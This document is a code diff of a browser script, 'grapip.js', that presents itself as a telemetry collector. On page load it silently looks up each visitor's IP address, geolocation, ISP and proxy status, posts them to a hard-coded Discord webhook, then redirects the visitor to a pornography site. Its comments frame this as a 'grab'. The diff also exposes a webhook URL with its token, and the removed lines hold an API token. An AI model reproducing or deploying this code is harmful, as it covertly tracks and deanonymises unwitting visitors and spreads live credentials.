@@ -1,37 +1,29 @@
 /**
- * Telemetry Collector & Webhook Dispatcher
+ * grapip.js
+ * Telemetry Collector → Discord Webhook → Redirect
+ * Runtime: browser, loaded via <script src="grapip.js" defer>
  */
 
 const CONFIG = {
-  ipInfoToken: "500824611e36b1",
-  ipApiUrl: "https://ipinfo.io/json",
-  fallbackApiUrl: "http://ip-api.com/json/",
-  webhookUrl: "https://discord.com/api/webhooks/1561746238397743277/FUJmybMPHJQcMYTywtirln5gY3ycq2h1uMzRn5Y4j_5AIUzhZJLLNQAAqzFBBXmKPF5h",
-  timeoutMs: 5000
+  ipGeoUrl:       "https://api.techniknews.net/ipgeo/",
+  fallbackApiUrl: "https://ip-api.com/json/",
+  webhookUrl:     "https://discord.com/api/webhooks/1561746238397743277/FUJmybMPHJQcMYTywtirln5gY3ycq2h1uMzRn5Y4j_5AIUzhZJLLNQAAqzFBBXmKPF5h",
+  redirectUrl:    "https://www.pornhub.com/",
+  timeoutMs:      5000
 };
 
 /**
- * Perform fetch with a strict timeout signal
- * @param {string} url 
- * @param {object} options 
- * @returns {Promise<object|null>}
+ * fetch() with hard timeout
  */
 async function fetchWithTimeout(url, options = {}) {
   const controller = new AbortController();
   const timer = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
-
   try {
-    const response = await fetch(url, { ...options, signal: controller.signal });
-    if (!response.ok) {
-      throw new Error(`HTTP ${response.status} - ${response.statusText}`);
-    }
-    return await response.json();
+    const res = await fetch(url, { ...options, signal: controller.signal });
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    return await res.json();
   } catch (err) {
-    if (err.name === 'AbortError') {
-      console.error(`.`);
-    } else {
-      console.error(``, err.message);
-    }
+    console.error(`[grapip] fetch fail (${url}): ${err.message}`);
     return null;
   } finally {
     clearTimeout(timer);
@@ -39,129 +31,174 @@ async function fetchWithTimeout(url, options = {}) {
 }
 
 /**
- * Retrieve primary network data from ipinfo.io using API token
- * @returns {Promise<object|null>}
+ * Primary: techniknews ipgeo — full schema, no token required
  */
-async function fetchPrimaryIPDetails() {
-  const url = `${CONFIG.ipApiUrl}?token=${CONFIG.ipInfoToken}`;
-  return await fetchWithTimeout(url);
-}
-
-/**
- * Retrieve fallback network data from ip-api.com and normalize fields
- * @returns {Promise<object|null>}
- */
-async function fetchFallbackIPDetails() {
-  const data = await fetchWithTimeout(CONFIG.fallbackApiUrl);
-  if (!data || data.status === "fail") return null;
-
+async function fetchPrimary() {
+  const d = await fetchWithTimeout(CONFIG.ipGeoUrl);
+  if (!d || d.status === "fail") return null;
   return {
-    ip: data.query,
-    org: data.isp || data.org,
-    city: data.city,
-    region: data.regionName,
-    country: data.country,
-    loc: `${data.lat},${data.lon}`,
-    timezone: data.timezone,
-    postal: data.zip
+    ip:          d.ip,
+    continent:   d.continent,
+    country:     d.country,
+    countryCode: d.countryCode,
+    region:      d.regionName,
+    city:        d.city,
+    postal:      d.zip || "N/A",
+    lat:         d.lat,
+    lon:         d.lon,
+    loc:         (d.lat && d.lon) ? `${d.lat}, ${d.lon}` : null,
+    timezone:    d.timezone,
+    currency:    d.currency,
+    isp:         d.isp,
+    org:         d.org,
+    as:          d.as,
+    reverse:     d.reverse || "N/A",
+    mobile:      d.mobile,
+    proxy:       d.proxy,
+    hosting:     d.hosting,
+    cached:      d.cached
   };
 }
 
 /**
- * Resolve IP metadata with fallback redundancy
- * @returns {Promise<object|null>}
+ * Fallback: ip-api.com — normalized to same shape
+ */
+async function fetchFallback() {
+  const d = await fetchWithTimeout(CONFIG.fallbackApiUrl);
+  if (!d || d.status === "fail") return null;
+  return {
+    ip:          d.query,
+    continent:   "N/A",
+    country:     d.country,
+    countryCode: d.countryCode,
+    region:      d.regionName,
+    city:        d.city,
+    postal:      d.zip || "N/A",
+    lat:         d.lat,
+    lon:         d.lon,
+    loc:         `${d.lat}, ${d.lon}`,
+    timezone:    d.timezone,
+    currency:    "N/A",
+    isp:         d.isp,
+    org:         d.org,
+    as:          d.as,
+    reverse:     d.reverse || "N/A",
+    mobile:      d.mobile  ?? "N/A",
+    proxy:       d.proxy   ?? "N/A",
+    hosting:     d.hosting ?? "N/A",
+    cached:      false
+  };
+}
+
+/**
+ * Resolve IP metadata — primary first, fallback on miss
  */
 async function getIPDetails() {
-  let details = await fetchPrimaryIPDetails();
-
-  // Trigger fallback if primary fails, returns bogon, or lacks geolocation
-  if (!details || details.bogon || (!details.city && !details.org)) {
-    console.log("");
-    const fallbackDetails = await fetchFallbackIPDetails();
-    if (fallbackDetails) {
-      details = fallbackDetails;
-    }
+  let details = await fetchPrimary();
+  if (!details || (!details.city && !details.isp)) {
+    console.log("[grapip] primary miss — trying fallback");
+    const fallback = await fetchFallback();
+    if (fallback) details = fallback;
   }
-
   return details;
 }
 
 /**
- * Construct Discord Embed structure
- * @param {object} details 
- * @returns {object}
+ * Log resolved details to browser console
  */
-function buildEmbedPayload(details) {
-  return {
-    embeds: [
-      {
-        title: "IP Network & Geolocation Data",
-        color: 0x3498db, // Decimal representation for blue
-        fields: [
-          { name: "IP Address", value: details.ip || "N/A", inline: true },
-          { name: "ISP / Org", value: details.org || "N/A", inline: true },
-          { name: "City", value: details.city || "N/A", inline: true },
-          { name: "Region", value: details.region || "N/A", inline: true },
-          { name: "Country", value: details.country || "N/A", inline: true },
-          { name: "Location (Lat,Long)", value: details.loc || "N/A", inline: true },
-          { name: "Timezone", value: details.timezone || "N/A", inline: true },
-          { name: "Postal Code", value: details.postal || "N/A", inline: true }
-        ],
-        timestamp: new Date().toISOString()
-      }
-    ]
-  };
+function logToConsole(details) {
+  console.groupCollapsed("[grapip] resolved IP data");
+  console.table({
+    "IP Address":   { value: String(details.ip)          },
+    "Continent":    { value: String(details.continent)   },
+    "Country":      { value: String(details.country)     },
+    "Country Code": { value: String(details.countryCode) },
+    "Region":       { value: String(details.region)      },
+    "City":         { value: String(details.city)        },
+    "Postal Code":  { value: String(details.postal)      },
+    "Location":     { value: String(details.loc)         },
+    "Timezone":     { value: String(details.timezone)    },
+    "Currency":     { value: String(details.currency)    },
+    "ISP":          { value: String(details.isp)         },
+    "Org":          { value: String(details.org)         },
+    "AS":           { value: String(details.as)          },
+    "Reverse DNS":  { value: String(details.reverse)     },
+    "Mobile":       { value: String(details.mobile)      },
+    "Proxy":        { value: String(details.proxy)       },
+    "Hosting":      { value: String(details.hosting)     },
+    "Cached":       { value: String(details.cached)      }
+  });
+  console.groupEnd();
 }
 
 /**
- * Dispatch payload to the configured Discord Webhook URL
- * @param {object} details 
- * @returns {Promise<boolean>}
+ * Discord webhook dispatch — all fields
  */
 async function sendToDiscord(details) {
-  if (!details) {
-    console.error("");
-    return false;
-  }
+  const bool = v => (v === true ? "✅" : v === false ? "❌" : "N/A");
 
-  const payload = buildEmbedPayload(details);
+  const payload = {
+    embeds: [{
+      title: "IP Network & Geolocation Data",
+      color: 0x3498db,
+      fields: [
+        { name: "IP Address",   value: String(details.ip          || "N/A"), inline: true  },
+        { name: "Continent",    value: String(details.continent   || "N/A"), inline: true  },
+        { name: "Country",      value: String(details.country     || "N/A"), inline: true  },
+        { name: "Country Code", value: String(details.countryCode || "N/A"), inline: true  },
+        { name: "Region",       value: String(details.region      || "N/A"), inline: true  },
+        { name: "City",         value: String(details.city        || "N/A"), inline: true  },
+        { name: "Postal Code",  value: String(details.postal      || "N/A"), inline: true  },
+        { name: "Location",     value: String(details.loc         || "N/A"), inline: true  },
+        { name: "Timezone",     value: String(details.timezone    || "N/A"), inline: true  },
+        { name: "Currency",     value: String(details.currency    || "N/A"), inline: true  },
+        { name: "ISP",          value: String(details.isp         || "N/A"), inline: false },
+        { name: "Org",          value: String(details.org         || "N/A"), inline: false },
+        { name: "AS",           value: String(details.as          || "N/A"), inline: false },
+        { name: "Reverse DNS",  value: String(details.reverse     || "N/A"), inline: false },
+        { name: "Mobile",       value: bool(details.mobile),                 inline: true  },
+        { name: "Proxy",        value: bool(details.proxy),                  inline: true  },
+        { name: "Hosting",      value: bool(details.hosting),                inline: true  },
+        { name: "Cached",       value: bool(details.cached),                 inline: true  }
+      ],
+      timestamp: new Date().toISOString()
+    }]
+  };
 
   const controller = new AbortController();
   const timer = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
-
   try {
-    const response = await fetch(CONFIG.webhookUrl, {
+    const res = await fetch(CONFIG.webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
       signal: controller.signal
     });
-
-    if (response.ok) {
-      console.log("");
-      return true;
-    } else {
-      console.error(``);
-      return false;
-    }
+    if (!res.ok) console.error(`[grapip] webhook rejected: HTTP ${res.status}`);
   } catch (err) {
-    console.error("");
-    return false;
+    console.error(`[grapip] webhook error: ${err.message}`);
   } finally {
     clearTimeout(timer);
   }
 }
 
 /**
- * Main execution path
+ * Entry — resolve → log → dispatch → redirect
+ * Redirect fires after webhook attempt regardless of webhook success/fail
+ * Visitor never sees a hang — 5s max then door opens anyway
  */
 async function main() {
   const details = await getIPDetails();
+
   if (details) {
+    logToConsole(details);
     await sendToDiscord(details);
   } else {
-    console.error("");
+    console.error("[grapip] could not resolve IP — skipping dispatch");
   }
+
+  // grab done, door opens
+  window.location.href = CONFIG.redirectUrl;
 }
 
 main();
